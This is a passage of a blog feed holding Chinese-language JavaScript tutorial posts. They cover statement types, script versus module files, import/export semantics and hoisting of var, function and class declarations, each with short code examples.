class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="空语句"><a href="#空语句" class="headerlink" title="空语句"></a>空语句</h3><p>空语句就是一个独立的分号，实际上没什么大用。我们来看一下：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">;</span></span><br></pre></td></tr></table></figure><h3 id="if-语句"><a href="#if-语句" class="headerlink" title="if 语句"></a>if 语句</h3><p>if 语句是条件语句。我想，对多数人来说，if 语句都是熟悉的老朋友了，也没有什么特别需要注意的用法</p><h3 id="switch-语句"><a href="#switch-语句" class="headerlink" title="switch 语句"></a>switch 语句</h3><p>switch 语句继承自 Java，Java 中的 switch 语句继承自 C 和 C++，原本 switch 语句是跳转的变形，所以我们如果要用它来实现分支，必须要加上 break。</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(<span class="built_in">num</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="number">2</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码当 num 为 1 时输出 1 2 3，当 num 为 2 时输出 2 3，当 num 为 3 时输出 3。如果我们要把它变成分支型，则需要在每个 case 后加上 break。</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(<span class="built_in">num</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>在 C 时代，switch 生成的汇编代码性能是略优于 if else 的，但是对 JavaScript 来说，则无本质区别。我个人的看法是，现在 switch 已经完全没有必要使用了，应该用 if else 结构代替。</p></blockquote><h3 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h3><p>循环语句应该也是你所熟悉的语句了</p><h4 id="while-循环和-do-while-循环"><a href="#while-循环和-do-while-循环" class="headerlink" title="while 循环和 do while 循环"></a>while 循环和 do while 循环</h4><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let a = <span class="number">100</span></span><br><span class="line"><span class="keyword">while</span>(a<span class="comment">--) &#123;</span></span><br><span class="line">    console.<span class="built_in">log</span>(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let a = <span class="number">101</span>;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(a);</span><br><span class="line">&#125; <span class="keyword">while</span>(a &lt; <span class="number">100</span>)</span><br></pre></td></tr></table></figure><blockquote><p>注意，这里 do while 循环无论如何至少会执行一次。</p></blockquote><h4 id="普通-for-循环"><a href="#普通-for-循环" class="headerlink" title="普通 for 循环"></a>普通 for 循环</h4><p>普通的 for 循环</p><h4 id="for-in-循环"><a href="#for-in-循环" class="headerlink" title="for in 循环"></a>for in 循环</h4><p>for in 循环枚举对象的属性，这里体现了属性的 enumerable 特征。</p><h4 id="for-of-循环和-for-await-of-循环"><a href="#for-of-循环和-for-await-of-循环" class="headerlink" title="for of 循环和 for await of 循环"></a>for of 循环和 for await of 循环</h4><p>for of 循环是非常棒的语法特性。</p><p>我们先看下基本用法，它可以用于数组：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">for</span>(let e of [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line">    console<span class="selector-class">.log</span>(e);</span><br></pre></td></tr></table></figure><p>但是实际上，它背后的机制是 iterator 机制。</p><p>我们可以给任何一个对象添加 iterator，使它可以用于 for of 语句，看下示例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o = &#123;  </span><br><span class="line">    [<span class="title class_">Symbol</span>.<span class="property">iterator</span>]:<span class="function">() =&gt;</span> (&#123;</span><br><span class="line">        <span class="attr">_value</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="title function_">next</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">_value</span> == <span class="number">10</span>)</span><br><span class="line">                <span class="keyword">return</span> &#123;</span><br><span class="line">                    <span class="attr">done</span>: <span class="literal">true</span></span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">value</span>: <span class="variable language_">this</span>.<span class="property">_value</span>++,</span><br><span class="line">                <span class="attr">done</span>: <span class="literal">false</span></span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> e <span class="keyword">of</span> o)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这段代码展示了如何为一个对象添加 iterator。但是，在实际操作中，我们一般不需要这样定义 iterator，我们可以使用 generator function。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span>* <span class="title function_">foo</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> e <span class="keyword">of</span> <span class="title function_">foo</span>())</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br></pre></td></tr></table></figure><p>这段代码展示了 generator function 和 foo 的配合。</p><p>此外，JavaScript 还为异步生成器函数配备了异步的 for of，我们来看一个例子：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sleep</span>(<span class="params">duration</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span>(<span class="params">resolve, reject</span>) &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(resolve,duration);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span>* <span class="title function_">foo</span>(<span class="params"></span>)&#123;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="keyword">yield</span> i++;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> <span class="title function_">await</span>(<span class="keyword">let</span> e <span class="keyword">of</span> <span class="title function_">foo</span>())</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br></pre></td></tr></table></figure><p>这段代码定义了一个异步生成器函数，异步生成器函数每隔一秒生成一个数字，这是一个无限的生成器。</p><p>接下来，我们使用 for await of 来访问这个异步生成器函数的结果，我们可以看到，这形成了一个每隔一秒打印一个数字的无限循环。</p><h3 id="return"><a href="#return" class="headerlink" title="return"></a>return</h3><p>return 语句用于函数中，它终止函数的执行，并且指定函数的返回值，这是大家非常熟悉语句了，也没有什么特殊之处。</p><h3 id="break-语句和-continue-语句"><a href="#break-语句和-continue-语句" class="headerlink" title="break 语句和 continue 语句"></a>break 语句和 continue 语句</h3><p>break 语句用于跳出循环语句或者 switch 语句，continue 语句用于结束本次循环并继续循环。</p><h3 id="with-语句"><a href="#with-语句" class="headerlink" title="with 语句"></a>with 语句</h3><p>with 语句是个非常巧妙的设计，但它把 JavaScript 的变量引用关系变得不可分析，所以一般都认为这种语句都属于糟粕。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o = &#123;<span class="attr">a</span>:<span class="number">1</span>, <span class="attr">b</span>:<span class="number">2</span>&#125;</span><br><span class="line"><span class="title function_">with</span>(<span class="params">o</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(a, b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>with 语句把对象的属性在它内部的作用域内变成变量。</p><h3 id="try-语句和-throw-语句"><a href="#try-语句和-throw-语句" class="headerlink" title="try 语句和 throw 语句"></a>try 语句和 throw 语句</h3><p>try 语句和 throw 语句用于处理异常。它们是配合使用的，所以我们就放在一起讲了。在大型应用中，异常机制非常重要。</p><h3 id="debugger-语句"><a href="#debugger-语句" class="headerlink" title="debugger 语句"></a>debugger 语句</h3><p>debugger 语句的作用是：通知调试器在此断点。在没有调试器挂载时，它不产生任何效果。</p><h2 id="声明型语句"><a href="#声明型语句" class="headerlink" title="声明型语句"></a>声明型语句</h2><h3 id="var"><a href="#var" class="headerlink" title="var"></a>var</h3><p>var 声明语句是古典的 JavaScript 中声明变量的方式。而现在，在绝大多数情况下，let 和 const</p><p>如果我们仍然想要使用 var，我的个人建议是，把它当做一种“保障变量是局部”的逻辑，遵循以下三条规则：</p><ol><li>声明同时必定初始化；</li><li>尽可能在离使用的位置近处声明；</li><li>不要在意重复声明。</li></ol><h3 id="let-和-const"><a href="#let-和-const" class="headerlink" title="let 和 const"></a>let 和 const</h3><p>let 和 const 是都是变量的声明，它们的特性非常相似，所以我们放在一起讲了。let 和 const 是新设计的语法，所以没有什么硬伤，非常地符合直觉。let 和 const 的作用范围是 if、for 等结构型语句。</p><h3 id="class-声明"><a href="#class-声明" class="headerlink" title="class 声明"></a>class 声明</h3><p>我们在之前的课程中，已经了解过 class 相关的用法。这里我们再从语法的角度来看一遍：</p><p>class 最基本的用法只需要 class 关键字、名称和一对大括号。它的声明特征跟 const 和 let 类似，都是作用于块级作用域，预处理阶段则会屏蔽外部变量。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> a = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">    console.log(a); <span class="comment">//抛错</span></span><br><span class="line">    <span class="keyword">class</span> <span class="symbol">a</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>class 内部，可以使用 constructor 关键字来定义构造函数。还能定义 getter&#x2F;setter 和方法。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Rectangle</span> &#123;</span><br><span class="line">  <span class="built_in">constructor</span>(height, width) &#123;</span><br><span class="line">    <span class="keyword">this</span>.height = height;</span><br><span class="line">    <span class="keyword">this</span>.width = width;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Getter</span></span><br><span class="line">  <span class="function">get <span class="title">area</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.<span class="built_in">calcArea</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Method</span></span><br><span class="line">  <span class="built_in">calcArea</span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.height * <span class="keyword">this</span>.width;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以目前的兼容性，class 中的属性只能写在构造函数中，相关标准正在 TC39 讨论。</p><blockquote><p>需要注意，class 默认内部的函数定义都是 strict 模式的。</p></blockquote><h3 id="函数声明"><a href="#函数声明" class="headerlink" title="函数声明"></a>函数声明</h3><p>函数声明使用 function 关键字。</p>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>09丨JavaScript-在script标签写export为什么会抛错？</title>
      <link href="/Blog/2019/01/29/relearn_FE/09%E4%B8%A8JavaScript-%E5%9C%A8script%E6%A0%87%E7%AD%BE%E5%86%99export%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E6%8A%9B%E9%94%99%EF%BC%9F/index/"/>
      <url>/Blog/2019/01/29/relearn_FE/09%E4%B8%A8JavaScript-%E5%9C%A8script%E6%A0%87%E7%AD%BE%E5%86%99export%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E6%8A%9B%E9%94%99%EF%BC%9F/index/</url>
      
        <content type="html"><![CDATA[<p>3## 脚本和模块</p><p>首先，JavaScript 有两种源文件，一种叫做脚本，一种叫做模块。这个区分是在 ES6 引入了模块机制开始的，在 ES5 和之前的版本中，就只有一种源文件类型（就只有脚本）。</p><p>脚本是可以由浏览器或者 node 环境引入执行的，而模块只能由 JavaScript 代码用 import 引入执行。</p><p>从概念上，我们可以认为<strong>脚本</strong>具有<strong>主动性（调用）</strong>的 JavaScript 代码段，是控制宿主完成一定任务的代码；而<strong>模块</strong>是被动性的 JavaScript 代码段，是<strong>等待被调用的库</strong>。</p><p>我们对标准中的语法产生式做一些对比，不难发现，实际上模块和脚本之间的区别仅仅在于是否包含 import 和 export。</p><p>脚本是一种兼容之前的版本的定义，在这个模式下，没有 import 就不需要处理加载“.js”文件问题。</p><p>现代浏览器可以支持用 script 标签引入模块或者脚本，如果要引入模块，必须给 script 标签添加 type&#x3D;“module”。如果引入脚本，则不需要 type。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;module&quot;</span> <span class="attr">src</span>=<span class="string">&quot;xxxxx.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样，就回答了我们标题中的问题，script 标签如果不加type&#x3D;“module”，默认认为我们加载的文件是脚本而非模块，如果我们在脚本中写了 export，当然会抛错。</p><p>脚本中可以包含语句。模块中可以包含三种内容：import 声明，export 声明和语句。普通语句我们会在下一课专门给你讲解，下面我们就来讲讲 import 声明和 export 声明。</p><p><img src="/Blog/img.png"></p><h3 id="import-声明"><a href="#import-声明" class="headerlink" title="import 声明"></a>import 声明</h3><p>我们首先来介绍一下 import 声明，import 声明有两种用法，一个是直接 import 一个模块，另一个是带 from 的 import，它能引入模块里的一些信息。</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;mod&quot;</span>; <span class="comment">//引入一个模块</span></span><br><span class="line"><span class="keyword">import</span> v <span class="keyword">from</span> <span class="string">&quot;mod&quot;</span>;  <span class="comment">//把模块默认的导出值放入变量v</span></span><br></pre></td></tr></table></figure><p>直接 import 一个模块，只是保证了这个模块代码被执行，引用它的模块是无法获得它的任何信息的。</p><p>带 from 的 import 意思是引入模块中的一部分信息，可以把它们变成本地的变量。<br>带 from 的 import 细分又有三种用法，我们可以分别看下例子：</p><ul><li>import x from “.&#x2F;a.js” 引入模块中导出的默认值。</li><li>import {a as x, modify} from “.&#x2F;a.js”; 引入模块中的变量。</li><li>import * as x from “.&#x2F;a.js” 把模块中所有的变量以类似对象属性的方式引入。<br>第一种方式还可以跟后两种组合使用。</li><li>import d, {a as x, modify} from “.&#x2F;a.js”</li><li>import d, * as x from “.&#x2F;a.js”</li></ul><p>语法要求不带 as 的默认值永远在最前。注意，这里的变量实际上仍然可以受到原来模块的控制。</p><p>我们看一个例子，假设有两个模块 a 和 b。我们在模块 a 中声明了变量和一个修改变量的函数，并且把它们导出。我们用 b 模块导入了变量和修改变量的函数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 模块 a：</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">modify</span>(<span class="params"></span>)&#123;</span><br><span class="line">    a = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 模块 b</span></span><br><span class="line"><span class="keyword">import</span> &#123;a, modify&#125; <span class="keyword">from</span> <span class="string">&quot;./a.js&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a);</span><br><span class="line"><span class="title function_">modify</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a);</span><br></pre></td></tr></table></figure><p>当我们调用修改变量的函数后，b 模块变量也跟着发生了改变。这说明导入与一般的赋值不同，导入后的变量只是改变了名字，它仍然与原来的变量是同一个。</p><h3 id="export-声明"><a href="#export-声明" class="headerlink" title="export 声明"></a>export 声明</h3><p>我们再来说说 export 声明。与 import 相对，export 声明承担的是导出的任务。</p><p>模块中导出变量的方式有两种，一种是独立使用 export 声明，另一种是直接在声明型语句前添加 export 关键字。</p><ul><li>独立使用 export 声明就是一个 export 关键字加上变量名列表，例如：<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export &#123;<span class="selector-tag">a</span>, <span class="selector-tag">b</span>, c&#125;;</span><br></pre></td></tr></table></figure></li><li>我们也可以直接在声明型语句前添加 export 关键字，这里的 export 可以加在任何声明性质的语句之前，整理如下：<ul><li>var</li><li>function (含 async 和 generator)</li><li>class</li><li>let</li><li>const</li></ul></li></ul><p>export 还有一种特殊的用法，就是跟 default 联合使用。export default 表示导出一个默认变量值，它可以用于 function 和 class。这里导出的变量是没有名称的，可以使用 <code>import x from &quot;./a.js&quot;</code> 这样的语法，在模块中引入。</p><p>export default 还支持一种语法，后面跟一个表达式，例如：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var a <span class="operator">=</span> &#123;&#125;<span class="comment">;</span></span><br><span class="line">export default a<span class="comment">;</span></span><br></pre></td></tr></table></figure><p><strong>但是，这里的行为跟导出变量是不一致的，这里导出的是值，导出的就是普通变量 a 的值，以后 a 的变化与导出的值就无关了，修改变量 a，不会使得其他模块中引入的 default 值发生改变。</strong></p><h2 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h2><p>JavaScript 执行前，会对脚本、模块和函数体中的语句进行预处理。预处理过程将会提前处理 var、函数声明、class、const 和 let 这些语句，以确定其中变量的意义。</p><p>因为一些历史包袱，这一部分内容非常复杂，首先我们看一下 var 声明。</p><h3 id="var-声明"><a href="#var-声明" class="headerlink" title="var 声明"></a>var 声明</h3><p>var 声明永远作用于脚本、模块和函数体这个级别，在预处理阶段，不关心赋值的部分，只管在当前作用域声明这个变量。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var a <span class="operator">=</span> <span class="number">1</span><span class="comment">;</span></span><br><span class="line"></span><br><span class="line">function foo() &#123;</span><br><span class="line">    console.log(a)<span class="comment">;</span></span><br><span class="line">    var a <span class="operator">=</span> <span class="number">2</span><span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo()<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>这段代码声明了一个脚本级别的 a，又声明了 foo 函数体级别的 a，我们注意到，函数体级的var出现在 console.log 语句之后。</p><p>但是预处理过程在执行之前，所以有函数体级的变量 a，就不会去访问外层作用域中的变量 a 了，而函数体级的变量 a 此时还没有赋值，所以是 undefined。我们再看一个情况：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(a);</span><br><span class="line">    <span class="keyword">if</span>(<span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo();</span><br></pre></td></tr></table></figure><p>这段代码比上一段代码在var a &#x3D; 2之外多了一段 if，我们知道 if(false) 中的代码永远不会被执行，但是预处理阶段并不管这个，var 的作用能够穿透一切语句结构，它只认脚本、模块和函数体三种语法结构。所以这里结果跟前一段代码完全一样，我们会得到 undefined。</p><p>我们看下一个例子，我们在运行时部分讲过类似的例子。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> o= &#123;<span class="attr">a</span>:<span class="number">3</span>&#125;</span><br><span class="line">    with(o) &#123;</span><br><span class="line">        <span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(o.a);</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo();</span><br></pre></td></tr></table></figure><p>在这个例子中，我们引入了 with 语句，我们用 with(o) 创建了一个作用域，并把 o 对象加入词法环境，在其中使用了var a &#x3D; 2;语句。</p><p>在预处理阶段，只认var中声明的变量，所以同样为 foo 的作用域创建了 a 这个变量，但是没有赋值。</p><p>在执行阶段，当执行到var a &#x3D; 2时，作用域变成了 with 语句内，这时候的 a 被认为访问到了对象 o 的属性 a，所以最终执行的结果，我们得到了 2 和 undefined。</p><p>这个行为是 JavaScript 公认的设计失误之一，一个语句中的 a 在预处理阶段和执行阶段被当做两个不同的变量，严重违背了直觉，但是今天，在 JavaScript 设计原则“don’t break the web”之下，已经无法修正了，所以你需要特别注意。</p><h3 id="function-声明"><a href="#function-声明" class="headerlink" title="function 声明"></a>function 声明</h3><p>function 声明的行为原本跟 var 非常相似，但是在最新的 JavaScript 标准中，对它进行了一定的修改，这让情况变得更加复杂了。</p><p>在全局（脚本、模块和函数体），function 声明表现跟 var 相似，不同之处在于，function 声明不但在作用域中加入变量，还会给它赋值。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(foo);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里声明了函数 foo，在声明之前，我们用 console.log 打印函数 foo，我们可以发现，已经是函数 foo 的值了。</p><p>function 声明出现在 if 等语句中的情况有点复杂，它仍然作用于脚本、模块和函数体级别，在预处理阶段，仍然会产生变量，它不再被提前赋值：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(foo);</span><br><span class="line"><span class="keyword">if</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码得到 undefined。如果没有函数声明，则会抛出错误。</p><p>这说明 function 在预处理阶段仍然发生了作用，在作用域中产生了变量，没有产生赋值，赋值行为发生在了执行阶段。</p><h3 id="class-声明"><a href="#class-声明" class="headerlink" title="class 声明"></a>class 声明</h3><p>class 声明在全局的行为跟 function 和 var 都不一样。</p><p>在 class 声明之前使用 class 名，会抛错：</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">console.log<span class="punctuation">(</span><span class="built_in">c</span><span class="punctuation">)</span>;</span><br><span class="line"><span class="built_in">class</span> <span class="built_in">c</span><span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>这段代码我们试图在 class 前打印变量 c，我们得到了个错误，这个行为很像是 class 没有预处理，但是实际上并非如此。</p><p>我们看个复杂一点的例子：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> c = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(c);</span><br><span class="line">    class c &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">foo();</span><br></pre></td></tr></table></figure><p>这个例子中，我们把 class 放进了一个函数体中，在外层作用域中有变量 c。然后试图在 class 之前打印 c。</p><p>执行后，我们看到，仍然抛出了错误，如果去掉 class 声明，则会正常打印出 1，也就是说，出现在后面的 class 声明影响了前面语句的结果。</p><p>这说明，class 声明也是会被预处理的，它会在作用域中创建变量，并且要求访问它时抛出错误。</p><p>class 的声明作用不会穿透 if 等语句结构，所以只有写在全局环境才会有声明作用。</p><p>这样的 